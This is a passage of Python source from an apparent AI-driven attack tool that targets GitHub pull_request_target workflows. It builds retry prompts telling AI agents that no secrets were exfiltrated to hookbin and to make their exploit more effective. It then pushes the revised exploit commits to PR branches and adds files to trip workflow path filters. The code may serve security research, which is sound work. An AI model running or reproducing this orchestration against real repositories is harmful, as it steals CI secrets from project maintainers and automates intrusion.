            logs_summary_sections: list[str] = []
            included_file_count = 0
            for log in attempt_logs:
                files = log.get("log_files")
                file_paths = [
                    path.strip()
                    for path in files
                    if isinstance(path, str) and path.strip()
                ] if isinstance(files, list) else []
                run_id = log.get("run_id", "unknown")
                extracted_logs = (
                    log.get("logs").strip()
                    if isinstance(log.get("logs"), str)
                    else ""
                )
                inline_file_contents = self._read_log_file_contents_for_prompt(
                    workspace_path=workspace_path,
                    relative_paths=file_paths,
                )
                included_file_count += len(file_paths)
                inline_logs = inline_file_contents or extracted_logs
                if file_paths:
                    file_listing = "\n".join(f"- {path}" for path in file_paths)
                    section = (
                        f"Attempt {log.get('attempt')}, run {run_id}, conclusion={log.get('conclusion', 'unknown')}\n"
                        f"Available error-related log files:\n{file_listing}"
                    )
                    if inline_logs:
                        section += f"\n\nError-related log file contents:\n{inline_logs}"
                    logs_summary_sections.append(section)
                else:
                    section = (
                        f"Attempt {log.get('attempt')}, run {run_id}, conclusion={log.get('conclusion', 'unknown')}\n"
                        "No extracted log files contained ##[error]."
                    )
                    if inline_logs:
                        section += f"\n\nError-related log file contents:\n{inline_logs}"
                    logs_summary_sections.append(section)
            logs_summary = "\n\n".join(logs_summary_sections)
            raw_logs_summary_bytes = len(logs_summary.encode("utf-8"))
            logs_summary = self._truncate_utf8_bytes(
                logs_summary,
                RETRY_LOG_PAYLOAD_MAX_BYTES,
            )
            head_sha_change_note = ""
            if isinstance(pr_head_sha_changes, list) and pr_head_sha_changes:
                transitions = [
                    f"{str(item.get('from') or '').strip()} -> {str(item.get('to') or '').strip()}"
                    for item in pr_head_sha_changes
                    if isinstance(item, dict)
                    and str(item.get("from") or "").strip()
                    and str(item.get("to") or "").strip()
                ]
                if transitions:
                    head_sha_change_note = (
                        "\n"
                        "FYI: The PR head commit changed while workflow monitoring was running "
                        f"({'; '.join(transitions)}). This can happen if GitHub Actions or other "
                        "automation commits to your branch. Inspect recent commits with "
                        "`git log --oneline --decorate -n 20` and inspect changes with "
                        "`git show <commit-sha>` before preparing the next attempt.\n"
                    )
            retry_section = (
                f"\n\n## Previous Attempt {attempt} Failed\n\n"
                f"The previous workflow run completed but no secrets were exfiltrated to hookbin.\n\n"
                f"Previous workflow logs:\n{logs_summary}\n\n"
                f"The log files above are available in the repository workspace under "
                f"`{WORKFLOW_LOGS_DIRNAME}/...`.\n"
                f"The commit history is available in the repository workspace under `git log`. Use `git show HEAD` to see your last commit\n"
                f"{head_sha_change_note}"
                "IMPORTANT RETRY WORKFLOW:\n"
                "1) Identify the first concrete error line in the logs.\n"
                "2) Explain the root cause briefly.\n"
                "3) Apply the smallest fix for that specific error.\n"
                "4) If logs suggest a specific command to run (for example in a `Run ...` line), execute it locally before finishing and report pass/fail in agent-output.json summary.\n"
                '5) If blocked, set `human_review_needed: true` in `agent-output.json` with a concise `reason`.\n'
                "Use `git revert HEAD --no-edit`, avoid `rm` to remove files and start/adjust a new attempt."
                "If your previous attempt causes the same workflow failure repeatedly, revert/adjust that approach instead of re-applying it.\n"
                f"Use your file tools to inspect the specific files you need before revising the exploit.\n\n"
                f"Please review the logs and modify your exploit to be more effective.\n"
            )
            retry_section_bytes = len(retry_section.encode("utf-8"))
            base_prompt_bytes = len(base_prompt.encode("utf-8"))
            allowed_retry_bytes = max(RETRY_PROMPT_MAX_BYTES - base_prompt_bytes, 0)
            if retry_section_bytes > allowed_retry_bytes:
                retry_section = self._truncate_utf8_bytes(retry_section, allowed_retry_bytes)
            updated_prompt = base_prompt + retry_section
            final_prompt_bytes = len(updated_prompt.encode("utf-8"))
            prompt_path.write_text(updated_prompt, encoding="utf-8")
            LOGGER.info(
                "attack.lifecycle %s",
                json.dumps(
                    {
                        "event": "prompt_build",
                        "stage": "retry",
                        "attempt": attempt,
                        "workspace_path": str(workspace_path),
                        "base_prompt_bytes": base_prompt_bytes,
                        "retry_log_bytes_raw": raw_logs_summary_bytes,
                        "retry_log_bytes_used": len(logs_summary.encode("utf-8")),
                        "retry_section_bytes_used": len(retry_section.encode("utf-8")),
                        "final_prompt_bytes": final_prompt_bytes,
                        "included_log_file_count": included_file_count,
                        "max_prompt_bytes": RETRY_PROMPT_MAX_BYTES,
                        "max_retry_log_bytes": RETRY_LOG_PAYLOAD_MAX_BYTES,
                    },
                    sort_keys=True,
                ),
            )

        if retry_openhands_runner is not None:
            self._prepare_agent_prompt_in_workspace(workspace_path)
            openhands_result = retry_openhands_runner()
            if not openhands_result.get("ok"):
                LOGGER.warning(
                    "Retry Agent execution failed (exit code: %s); aborting retries.",
                    openhands_result.get("exit_code"),
                )
                return False

        commit_result = self._commit_and_push_in_sandbox(
            sandbox=sandbox,
            branch=branch_name,
            commit_message=f"Update exploit based on attempt {attempt} feedback",
            workspace_path=workspace_path,
            required_path_filters=required_path_filters,
        )
        if commit_result.get("committed"):
            LOGGER.info(f"Pushed retry attempt {attempt + 1}")
            return True

        return False

    def _retry_after_missing_required_path_changes(
        self,
        *,
        workspace_path: Path,
        sandbox: RepositorySandbox,
        branch_name: str,
        attempt: int,
        required_path_filters: list[str],
        changed_paths: list[str],
        retry_openhands_runner: Callable[[], dict[str, Any]] | None = None,
    ) -> bool:
        prompt_path = workspace_path.parent / AGENT_TASK_FILENAME
        if not prompt_path.exists():
            LOGGER.warning(
                "Cannot retry Agent after missing path-filter change: missing prompt file %s",
                prompt_path,
            )
            return False

        changed_summary = (
            "\n".join(f"- {path}" for path in changed_paths[:30])
            if changed_paths
            else "- (no changed files detected in PR history)"
        )
        required_summary = "\n".join(
            f"- {pattern}" for pattern in required_path_filters[:30]
        )

        current_prompt = prompt_path.read_text(encoding="utf-8")
        updated_prompt = current_prompt + (
            f"\n\n## Controller Feedback: Missing Workflow Path Trigger (Attempt {attempt})\n\n"
            "The focused `pull_request_target` workflow has path filters. "
            "The current pull request history does not include a changed file matching "
            "those filters, so no workflow run was triggered.\n"
            "At least one commit in this PR must touch a matching path. This does not "
            "need to happen in every attempt, but it must exist somewhere in PR history.\n\n"
            f"Required path filters:\n{required_summary}\n\n"
            f"Current changed files in PR history:\n{changed_summary}\n\n"
            "Revise the exploit and include at least one concrete change that matches the "
            "required path filters.\n"
        )
        prompt_path.write_text(updated_prompt, encoding="utf-8")

        if retry_openhands_runner is not None:
            self._prepare_agent_prompt_in_workspace(workspace_path)
            openhands_result = retry_openhands_runner()
            if not openhands_result.get("ok"):
                LOGGER.warning(
                    "Retry Agent execution after missing path-filter change failed "
                    "(exit code: %s).",
                    openhands_result.get("exit_code"),
                )
                return False

        commit_result = self._commit_and_push_in_sandbox(
            sandbox=sandbox,
            branch=branch_name,
            commit_message=f"Update exploit to satisfy path trigger on attempt {attempt}",
            workspace_path=workspace_path,
            required_path_filters=required_path_filters,
        )
        return bool(commit_result.get("committed"))

    def _ensure_required_path_filter_change(
        self,
        *,
        workspace_path: Path,
        required_path_filters: list[str],
    ) -> tuple[bool, str | None]:
        normalized_filters = [
            item.strip()
            for item in required_path_filters
            if isinstance(item, str) and item.strip()
        ]
        if not normalized_filters:
            return True, None

        trigger_path, exact_path = self._select_required_path_filter_trigger_path(
            required_path_filters=normalized_filters
        )
        if not trigger_path:
            return (
                False,
                (
                    "Controller could not derive a deterministic file path that matches "
                    "the workflow pull_request_target path filters."
                ),
            )
        if self._path_is_excluded_from_controller_commit(trigger_path):
            return (
                False,
                (
                    f"Derived required path-filter trigger `{trigger_path}` is excluded "
                    "from controller commits."
                ),
            )

        if self._workspace_file_has_git_diff(
            workspace_path=workspace_path,
            relative_path=trigger_path,
        ):
            return True, None

        target_path = (workspace_path / trigger_path).resolve()
        try:
            target_path.relative_to(workspace_path.resolve())
        except ValueError:
            return (
                False,
                (
                    f"Derived required path-filter trigger `{trigger_path}` resolves "
                    "outside of the workspace."
                ),
            )

        if exact_path and target_path.exists() and not target_path.is_file():
            return (
                False,
                f"Required path-filter trigger target is not a regular file: {trigger_path}",
            )

        try:
            target_path.parent.mkdir(parents=True, exist_ok=True)
            if exact_path and target_path.exists():
                content = target_path.read_text(encoding="utf-8")
                target_path.write_text(f"{content}\n", encoding="utf-8")
            elif exact_path and target_path.suffix.lower() == ".json":
                target_path.write_text("{}\n", encoding="utf-8")
            else:
                target_path.write_text(
                    f"{PATH_FILTER_TRIGGER_NOTE}\n",
                    encoding="utf-8",
                )
        except UnicodeDecodeError:
            return (
                False,
                (
                    f"Required path-filter file `{trigger_path}` is not UTF-8 text; "
                    "controller cannot apply a safe no-op edit."
                ),
            )
        except OSError as exc:
            return (
                False,
                f"Failed writing required path-filter trigger `{trigger_path}`: {exc}",
            )

        LOGGER.info(
            "Applied deterministic workflow path-filter trigger via `%s`.",
            trigger_path,
        )
        return True, None

    def _select_required_path_filter_trigger_path(
        self,
        *,
        required_path_filters: list[str],
    ) -> tuple[str | None, bool]:
        has_positive = False
        for raw_filter in required_path_filters:
            pattern = raw_filter.strip()
            if not pattern or pattern.startswith("!"):
                continue
            has_positive = True

            candidate_path, exact_path = self._materialize_path_filter_candidate_path(
                pattern
            )
            if not candidate_path:
                continue
            if self._matches_github_path_filters(
                path=candidate_path,
                path_filters=required_path_filters,
            ):
                return candidate_path, exact_path
        if not has_positive:
            fallback = PATH_FILTER_TRIGGER_FILENAME
            if self._matches_github_path_filters(
                path=fallback,
                path_filters=required_path_filters,
            ):
                return fallback, False
        return None, False

    @staticmethod
    def _materialize_path_filter_candidate_path(pattern: str) -> tuple[str | None, bool]:
        normalized_pattern = pattern.strip().lstrip("/")
        if not normalized_pattern:
            return None, False

        exact_path = not _has_wildcards(normalized_pattern)
        if exact_path:
            if normalized_pattern.endswith("/"):
                normalized_pattern = f"{normalized_pattern}{PATH_FILTER_TRIGGER_FILENAME}"
                exact_path = False
            return normalized_pattern, exact_path

        candidate = normalized_pattern
        candidate = candidate.replace("**/", "pwnhunter-trigger/")
        candidate = candidate.replace("**", "pwnhunter-trigger")
        candidate = candidate.replace("*", "pwnhunter-trigger")
        candidate = candidate.replace("?", "x")
        candidate = re.sub(r"\[[^\]]+\]", "x", candidate)
        candidate = re.sub(r"\{[^}]+\}", "x", candidate)
        candidate = candidate.replace("//", "/")
        if candidate.endswith("/"):
            candidate = f"{candidate}{PATH_FILTER_TRIGGER_FILENAME}"
        return candidate.strip("/"), False

    @staticmethod
    def _path_is_excluded_from_controller_commit(path: str) -> bool:
        normalized_path = path.strip().lstrip("/").replace("\\", "/")
        if not normalized_path:
            return True
        for excluded in HOUSEKEEPING_COMMIT_EXCLUDES:
            normalized_excluded = excluded.strip().lstrip("/").rstrip("/")
            if not normalized_excluded:
                continue
            if (
                normalized_path == normalized_excluded
                or normalized_path.startswith(f"{normalized_excluded}/")
            ):
                return True
        return False

    def _workspace_file_has_git_diff(
        self,
        *,
        workspace_path: Path,
        relative_path: str,
    ) -> bool:
        env = self._workspace_subprocess_env(workspace_path)
        result = subprocess.run(
            ["git", "status", "--porcelain", "--", relative_path],
            cwd=workspace_path,
            check=False,
            capture_output=True,
            text=True,
            env=env,
        )
        return bool(result.stdout.strip())

    def _append_required_path_filter_guidance(
        self,
        *,
        prompt_path: Path,
        required_path_filters: list[str],
    ) -> None:
        filters = [
            item.strip()
            for item in required_path_filters
            if isinstance(item, str) and item.strip()
        ]
        if not filters:
            return
        if not prompt_path.exists():
            return

        marker = "## Pull Request Path Filter Requirements"
        try:
            current_prompt = prompt_path.read_text(encoding="utf-8")
        except OSError:
            return
        if marker in current_prompt:
            return

        filters_text = "\n".join(f"- {item}" for item in filters[:30])
        guidance = (
            f"\n\n{marker}\n\n"
            "The focused `pull_request_target` workflow only triggers when the pull request "
            "history includes at least one changed file matching these path filters:\n"
            f"{filters_text}\n\n"
            "Ensure your exploit attempt includes at least one concrete file change that "
            "matches one of these filters."
        )
        prompt_path.write_text(current_prompt + guidance, encoding="utf-8")

    def _pull_request_has_required_path_changes(
        self,
        *,
        client: GitHubClient,
        repo_name: str,
        pr_number: int,
        required_path_filters: list[str],
    ) -> tuple[bool, list[str]]:
        files_method = getattr(client, "list_pull_request_files", None)
        if not callable(files_method):
            LOGGER.warning(
                "GitHub client has no list_pull_request_files method; cannot validate PR path filters."
            )
            return True, []

        try:
            file_entries = files_method(repo_name, pr_number)
        except Exception as exc:
            LOGGER.warning(
                "Failed listing PR files for %s#%s while validating path filters: %s",
                repo_name,
                pr_number,
                exc,
            )
            return True, []

        changed_paths: list[str] = []
        matched = False
        for entry in file_entries:
            if not isinstance(entry, dict):
                continue
            candidates: list[str] = []
            filename = entry.get("filename")
            previous_filename = entry.get("previous_filename")
            if isinstance(filename, str) and filename.strip():
                candidates.append(filename.strip().replace("\\", "/"))
            if isinstance(previous_filename, str) and previous_filename.strip():
                candidates.append(previous_filename.strip().replace("\\", "/"))
            for candidate in candidates:
                if candidate not in changed_paths:
                    changed_paths.append(candidate)
                if self._matches_github_path_filters(
                    path=candidate,
                    path_filters=required_path_filters,
                ):
                    matched = True
        return matched, changed_paths

    @staticmethod
    def _matches_github_path_filters(*, path: str, path_filters: list[str]) -> bool:
        normalized_path = path.strip().lstrip("/").replace("\\", "/")
        if not normalized_path:
            return False
        has_positive = False
        matched = False
        for raw_filter in path_filters:
            if not isinstance(raw_filter, str):
                continue
            pattern = raw_filter.strip()
            if not pattern:
                continue
            is_negative = pattern.startswith("!")
            if is_negative:
                pattern = pattern[1:].strip()
            normalized_pattern = pattern.lstrip("/")
            if not normalized_pattern:
                continue
            if is_negative:
                if fnmatch.fnmatch(normalized_path, normalized_pattern):
                    matched = False
                continue
            has_positive = True
            if fnmatch.fnmatch(normalized_path, normalized_pattern):
                matched = True
        return matched if has_positive else True


from pwn_hunter_ai.attack.execution_service_agent_methods import (
    _build_local_pull_request_target_event,
    _build_local_runner_env,
    _build_safe_confirmation_record,
    _cleanup_docker_resources_after_repository_processing,
    _clear_learning_field_in_agent_output,
    _collect_and_persist_learning_after_success,
    _confirm_not_vulnerable_with_fresh_conversations,
    _extract_learning_entries,
    _is_not_vulnerable_signal,
    _is_retryable_initial_gemini_timeout,
    _normalize_learning_text,
    _persist_run_level_learning,
    _prepare_agent_prompt_in_workspace,
    _prepare_gemini_context_in_workspace,
    _prepare_local_test_files_in_workspace,
    _prepare_openhands_prompt_in_workspace,
    _parse_local_secrets_values,
    _prompt_gemini_for_success_learning,
    _render_local_secrets_with_dummy_values,
    _read_latest_agent_runtime_status,
    _read_learning_from_agent_output,
    _reset_agent_conversation_state,
    _resolve_run_root,
    _retry_initial_gemini_timeout_if_needed,
    _run_agent_headless_on_host,
    _run_agent_with_fallback,
    _run_agent_with_secret_sync,
    _run_openhands_headless_on_host,
    _run_openhands_with_fallback,
    _sync_workspace_secrets_to_repository,
    _sync_learnings_into_workspace,
)

AttackExecutionService._run_agent_with_fallback = _run_agent_with_fallback
AttackExecutionService._run_agent_with_secret_sync = _run_agent_with_secret_sync
AttackExecutionService._prepare_agent_prompt_in_workspace = _prepare_agent_prompt_in_workspace
AttackExecutionService._persist_run_level_learning = _persist_run_level_learning
AttackExecutionService._sync_learnings_into_workspace = _sync_learnings_into_workspace
AttackExecutionService._prepare_gemini_context_in_workspace = _prepare_gemini_context_in_workspace
AttackExecutionService._read_learning_from_agent_output = _read_learning_from_agent_output
AttackExecutionService._resolve_run_root = staticmethod(_resolve_run_root)
AttackExecutionService._normalize_learning_text = staticmethod(_normalize_learning_text)
AttackExecutionService._extract_learning_entries = staticmethod(_extract_learning_entries)
AttackExecutionService._prepare_local_test_files_in_workspace = _prepare_local_test_files_in_workspace
AttackExecutionService._parse_local_secrets_values = staticmethod(_parse_local_secrets_values)
AttackExecutionService._render_local_secrets_with_dummy_values = staticmethod(
    _render_local_secrets_with_dummy_values
)
AttackExecutionService._build_local_pull_request_target_event = staticmethod(_build_local_pull_request_target_event)
AttackExecutionService._build_local_runner_env = staticmethod(_build_local_runner_env)
AttackExecutionService._sync_workspace_secrets_to_repository = _sync_workspace_secrets_to_repository
AttackExecutionService._cleanup_docker_resources_after_repository_processing = _cleanup_docker_resources_after_repository_processing
AttackExecutionService._collect_and_persist_learning_after_success = _collect_and_persist_learning_after_success
AttackExecutionService._clear_learning_field_in_agent_output = _clear_learning_field_in_agent_output
AttackExecutionService._prompt_gemini_for_success_learning = _prompt_gemini_for_success_learning
AttackExecutionService._confirm_not_vulnerable_with_fresh_conversations = _confirm_not_vulnerable_with_fresh_conversations
AttackExecutionService._build_safe_confirmation_record = _build_safe_confirmation_record
AttackExecutionService._is_not_vulnerable_signal = _is_not_vulnerable_signal
AttackExecutionService._reset_agent_conversation_state = _reset_agent_conversation_state
AttackExecutionService._run_agent_headless_on_host = _run_agent_headless_on_host
AttackExecutionService._run_openhands_with_fallback = _run_openhands_with_fallback
AttackExecutionService._prepare_openhands_prompt_in_workspace = _prepare_openhands_prompt_in_workspace
AttackExecutionService._run_openhands_headless_on_host = _run_openhands_headless_on_host
AttackExecutionService._retry_initial_gemini_timeout_if_needed = _retry_initial_gemini_timeout_if_needed
AttackExecutionService._is_retryable_initial_gemini_timeout = _is_retryable_initial_gemini_timeout
AttackExecutionService._read_latest_agent_runtime_status = _read_latest_agent_runtime_status
